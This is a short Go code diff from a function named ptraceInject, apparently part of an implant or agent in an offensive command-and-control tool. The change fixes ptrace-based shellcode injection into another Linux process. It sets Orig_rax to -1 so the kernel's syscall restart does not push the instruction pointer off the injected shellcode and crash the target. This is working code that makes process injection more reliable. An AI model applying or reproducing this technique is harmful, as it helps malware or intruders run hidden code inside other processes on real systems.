@@ -362,8 +362,14 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 
 	// Step 5: Set RIP to the shellcode in the now-executable page
+	// CRITICAL: Set Orig_rax to -1 to prevent Linux syscall restart mechanism.
+	// When the target was stopped inside a syscall (e.g., nanosleep), orig_rax
+	// contains the syscall number. If we resume with orig_rax still set, the
+	// kernel backs up RIP by 2 bytes (to re-execute the syscall instruction),
+	// causing SIGSEGV since our shellcode page-2 is not mapped/executable.
 	newRegs := origRegs
 	newRegs.Rip = rwAddr
+	newRegs.Orig_rax = ^uint64(0) // -1: disable syscall restart
 	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
